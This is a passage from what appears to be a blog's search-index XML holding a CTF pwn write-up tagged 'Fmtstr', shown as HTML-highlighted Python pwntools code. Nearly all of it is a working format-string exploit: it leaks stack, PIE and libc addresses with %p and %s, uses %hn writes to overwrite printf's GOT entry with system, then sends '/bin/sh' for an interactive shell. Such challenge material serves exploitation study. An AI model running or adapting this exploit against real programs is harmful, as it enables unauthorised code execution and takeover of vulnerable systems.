ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x130A)&#x27;)</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;%p%6$p&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;hello\n&#x27;</span>,payload)</span><br><span class="line">addr=ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">addr=addr.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base1=<span class="built_in">int</span>(addr[<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">buf=<span class="built_in">int</span>(addr[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;base1&#x27;</span>,base1)</span><br><span class="line">p(<span class="string">&#x27;buf&#x27;</span>,buf)</span><br><span class="line">base2=base1+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(base2&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%11$p\x00&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)-elf.symbols[<span class="string">&#x27;main&#x27;</span>]-<span class="number">30</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_got+=pie</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_got&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf addr</span></span><br><span class="line">sl(<span class="string">b&#x27;%11$s\x00&#x27;</span>)</span><br><span class="line">printf_addr=u32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">base=printf_addr-libc.dump(<span class="string">&quot;printf&quot;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#change base1-4 ---7</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((base1-<span class="number">0xc</span>)&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((printf_got&amp;<span class="number">0xffff</span>)+<span class="number">2</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sysl=system_addr&amp;<span class="number">0xffff</span></span><br><span class="line">sysh=(system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%11$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysh-sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%7$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">r(sysl+sysh)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>shellZzz</p>]]></content>
      
      
      
        <tags>
            
            <tag> Fmtstr </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
